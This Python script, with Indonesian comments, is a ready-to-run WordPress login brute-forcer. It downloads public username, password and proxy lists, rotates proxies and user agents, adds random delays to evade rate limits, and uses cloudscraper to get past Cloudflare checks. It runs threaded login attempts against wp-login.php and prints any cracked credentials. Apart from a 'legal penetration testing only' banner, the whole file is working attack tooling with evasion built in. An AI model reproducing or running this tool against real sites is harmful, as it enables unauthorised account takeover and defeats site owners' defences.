import os
import sys
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from tqdm import tqdm
from colorama import Fore, Style, init
import cloudscraper
from urllib.parse import urljoin

# Inisialisasi colorama
init(autoreset=True)

class AdvancedWPBruteforcer:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper()
        self.found_credentials = []
        self.total_attempts = 0
        self.success = False
        self.current_proxy = None
        self.proxy_list = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        
        # Konfigurasi
        self.config = {
            'max_threads': 10,
            'request_delay': (1, 3),  # Delay acak antara 1-3 detik
            'max_retries': 3,
            'proxy_timeout': 10
        }
        
        # Wordlist URLs
        self.wordlist_urls = {
            'usernames': "https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt",
            'passwords': "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
            'proxies': "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        }
        
        # Colors
        self.colors = {
            'info': Fore.CYAN + Style.BRIGHT,
            'success': Fore.GREEN + Style.BRIGHT,
            'warning': Fore.YELLOW + Style.BRIGHT,
            'error': Fore.RED + Style.BRIGHT,
            'debug': Fore.MAGENTA,
            'reset': Style.RESET_ALL
        }

    def print_banner(self):
        banner = f"""
{self.colors['success']}
██╗    ██╗██████╗ ██████╗  ██████╗ ███████╗██████╗ ███████╗███████╗
██║    ██║██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝
██║ █╗ ██║██████╔╝██████╔╝██║   ██║███████╗██████╔╝█████╗  ███████╗
██║███╗██║██╔═══╝ ██╔══██╗██║   ██║╚════██║██╔═══╝ ██╔══╝  ╚════██║
╚███╔███╔╝██║     ██║  ██║╚██████╔╝███████║██║     ███████╗███████║
 ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚══════╝
{Style.RESET_ALL}
{self.colors['info']}WordPress Bruteforce Tool v1.0 | By Dras{self.colors['reset']}
{self.colors['warning']}FOR LEGAL PENETRATION TESTING ONLY!{self.colors['reset']}
"""
        print(banner)

    def setup_environment(self):
        """Persiapan environment dan download dependencies"""
        try:
            if not os.path.exists('wordlists'):
                os.makedirs('wordlists')
                
            if not os.path.exists('proxies'):
                os.makedirs('proxies')
                
        except Exception as e:
            print(f"{self.colors['error']}[!] Setup error: {str(e)}{self.colors['reset']}")
            sys.exit(1)

    def download_resources(self):
        """Download semua resources yang diperlukan"""
        print(f"{self.colors['info']}\n[+] Downloading required resources...{self.colors['reset']}")
        
        for name, url in self.wordlist_urls.items():
            if name == 'proxies':
                path = f"proxies/{name}.txt"
            else:
                path = f"wordlists/{name}.txt"
                
            if not os.path.exists(path):
                try:
                    print(f"{self.colors['info']}[*] Downloading {name} wordlist...{self.colors['reset']}")
                    response = requests.get(url, timeout=30)
                    with open(path, 'wb') as f:
                        f.write(response.content)
                    print(f"{self.colors['success']}[+] {name} downloaded successfully!{self.colors['reset']}")
                except Exception as e:
                    print(f"{self.colors['error']}[!] Failed to download {name}: {str(e)}{self.colors['reset']}")
                    if name == 'proxies':
                        print(f"{self.colors['warning']}[!] Continuing without proxies...{self.colors['reset']}")
                    else:
                        sys.exit(1)
        
        # Load proxy list
        self.load_proxies()

    def load_proxies(self):
        """Muat dan validasi proxy list"""
        proxy_file = "proxies/proxies.txt"
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                self.proxy_list = [line.strip() for line in f if line.strip()]
                
            print(f"{self.colors['info']}[*] Loaded {len(self.proxy_list)} proxies{self.colors['reset']}")
            
            # Validasi proxy
            print(f"{self.colors['info']}[*] Validating proxies...{self.colors['reset']}")
            working_proxies = []
            
            with ThreadPoolExecutor(max_workers=20) as executor:
                results = list(tqdm(executor.map(self.validate_proxy, self.proxy_list[:50]),  # Validasi 50 pertama saja
                                  total=min(50, len(self.proxy_list)),
                                  desc=f"{self.colors['info']}Validating proxies{self.colors['reset']}",
                                  bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.CYAN, Fore.RESET)))
                
                working_proxies = [proxy for proxy, status in zip(self.proxy_list[:50], results) if status]
            
            self.proxy_list = working_proxies
            print(f"{self.colors['success']}[+] Found {len(self.proxy_list)} working proxies{self.colors['reset']}")
            
            if self.proxy_list:
                self.current_proxy = random.choice(self.proxy_list)
        else:
            print(f"{self.colors['warning']}[!] No proxy list found. Using direct connection.{self.colors['reset']}")

    def validate_proxy(self, proxy):
        """Validasi apakah proxy bekerja"""
        try:
            test_url = "http://httpbin.org/ip"
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            response = requests.get(test_url, proxies=proxies, timeout=self.config['proxy_timeout'])
            if response.status_code == 200:
                return True
        except:
            pass
        return False

    def rotate_proxy(self):
        """Rotasi ke proxy berikutnya"""
        if self.proxy_list:
            self.current_proxy = random.choice(self.proxy_list)
            proxies = {"http": f"http://{self.current_proxy}", "https": f"http://{self.current_proxy}"}
            self.scraper.proxies = proxies
            print(f"{self.colors['debug']}[*] Rotated to proxy: {self.current_proxy}{self.colors['reset']}")

    def get_login_page(self, url):
        """Ambil halaman login dengan bypass Cloudflare"""
        try:
            response = self.scraper.get(url)
            
            if "Cloudflare" in response.text and "Checking your browser" in response.text:
                print(f"{self.colors['warning']}[!] Cloudflare detected. Solving challenge...{self.colors['reset']}")
                time.sleep(5)
                response = self.scraper.get(url)
            
            return response
        except Exception as e:
            print(f"{self.colors['error']}[!] Failed to get login page: {str(e)}{self.colors['reset']}")
            return None

    def try_login(self, url, username, password, progress_bar=None):
        """Coba login dengan semua bypass"""
        if self.success:
            return True
            
        for attempt in range(self.config['max_retries']):
            try:
                if attempt > 0 and self.proxy_list:
                    self.rotate_proxy()
                
                delay = random.uniform(*self.config['request_delay'])
                time.sleep(delay)
                
                login_url = f"{url}/wp-login.php"
                response = self.get_login_page(login_url)
                
                if not response:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                
                login_data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': f"{url}/wp-admin/",
                    'testcookie': '1'
                }
                
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                login_response = self.scraper.post(login_url, data=login_data, headers=headers)
                
                self.total_attempts += 1
                if progress_bar:
                    progress_bar.update(1)
                
                if any(c.name.startswith('wordpress_logged_in') for c in self.scraper.cookies):
                    self.success = True
                    self.found_credentials.append((username, password))
                    if progress_bar:
                        progress_bar.close()
                    print(f"\n{self.colors['success']}[CRACKED] {username}:{password}{self.colors['reset']}")
                    return True
                    
            except Exception as e:
                print(f"{self.colors['debug']}[*] Attempt failed: {str(e)}{self.colors['reset']}")
                continue
                
        return False

    def bruteforce_attack(self, url, username_list, password_list):
        """Jalankan serangan bruteforce"""
        total_combinations = len(username_list) * len(password_list)
        print(f"\n{self.colors['info']}[*] Starting advanced bruteforce attack{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Target: {url}{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Usernames loaded: {len(username_list)}{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Passwords loaded: {len(password_list)}{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Total combinations: {total_combinations}{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Using {self.config['max_threads']} threads{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Request delay: {self.config['request_delay'][0]}-{self.config['request_delay'][1]}s{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Max retries: {self.config['max_retries']}{self.colors['reset']}")
        print(f"{self.colors['warning']}[!] Press Ctrl+C to stop\n{self.colors['reset']}")

        start_time = time.time()
        
        try:
            with tqdm(total=total_combinations, 
                     desc=f"{self.colors['info']}Progress{self.colors['reset']}", 
                     bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.CYAN, Fore.RESET)) as pbar:
                
                with ThreadPoolExecutor(max_workers=self.config['max_threads']) as executor:
                    for username in username_list:
                        if self.success:
                            break
                        for password in password_list:
                            if self.success:
                                break
                            executor.submit(self.try_login, url, username, password, pbar)
                            
        except KeyboardInterrupt:
            print(f"\n{self.colors['warning']}[!] Bruteforce interrupted by user{self.colors['reset']}")
        
        elapsed_time = time.time() - start_time
        attempts_per_sec = self.total_attempts / elapsed_time if elapsed_time > 0 else 0
        
        print(f"\n{self.colors['info']}[*] Attack completed{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Time elapsed: {elapsed_time:.2f} seconds{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Attempts made: {self.total_attempts}{self.colors['reset']}")
        print(f"{self.colors['info']}[*] Speed: {attempts_per_sec:.2f} attempts/second{self.colors['reset']}")
        
        if self.found_credentials:
            print(f"\n{self.colors['success']}[+] Found valid credentials:{self.colors['reset']}")
            for cred in self.found_credentials:
                print(f"{self.colors['success']}Username: {cred[0]} | Password: {cred[1]}{self.colors['reset']}")
        else:
            print(f"{self.colors['error']}[-] No valid credentials found{self.colors['reset']}")

    def run(self, url, threads=10):
        """Jalankan tools"""
        self.print_banner()
        self.setup_environment()
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        print(f"{self.colors['info']}[*] Checking WordPress login at {url}{self.colors['reset']}")
        
        self.download_resources()
        
        try:
            with open('wordlists/usernames.txt', 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
                
            with open('wordlists/passwords.txt', 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{self.colors['error']}[!] Error loading wordlists: {str(e)}{self.colors['reset']}")
            sys.exit(1)
        
        self.config['max_threads'] = threads
        
        self.bruteforce_attack(url, usernames[:200], passwords[:200])  # Batasi untuk demo

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"{Fore.RED}Usage: python wp_brute.py <target_url> [threads]{Style.RESET_ALL}")
        sys.exit(1)
        
    target_url = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    
    try:
        import cloudscraper
    except ImportError:
        print(f"{Fore.YELLOW}[!] Installing required packages...{Style.RESET_ALL}")
        os.system("pip install cloudscraper")
    
    brute = AdvancedWPBruteforcer()
    brute.run(target_url, threads)
